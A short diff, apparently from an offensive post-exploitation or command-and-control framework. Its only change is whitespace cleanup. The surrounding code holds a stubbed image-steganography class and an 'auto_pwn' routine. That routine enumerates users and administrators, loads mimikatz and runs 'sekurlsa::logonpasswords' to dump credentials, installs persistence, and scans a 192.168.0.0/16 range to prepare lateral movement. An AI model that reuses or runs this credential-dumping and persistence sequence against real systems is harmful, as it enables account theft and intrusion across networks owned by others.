@@ -225,11 +225,11 @@ dns_protocol.enable_doh(
 class SteganographyProtocol:
     def __init__(self):
         self.carrier_type = "image"
-    
+
     def encode_message(self, message, carrier):
         # Hide message in image
         return stego_image
-    
+
     def decode_message(self, carrier):
         # Extract message from image
         return message
@@ -555,15 +555,15 @@ def auto_pwn(session):
     session.sysinfo()
     session.execute("net user")
     session.execute("net localgroup administrators")
-    
+
     # Dump credentials
     session.load_module("mimikatz")
     session.execute("privilege::debug")
     session.execute("sekurlsa::logonpasswords")
-    
+
     # Persistence
     session.install_persistence()
-    
+
     # Lateral movement prep
     session.scan_network("192.168.0.0/16")
 
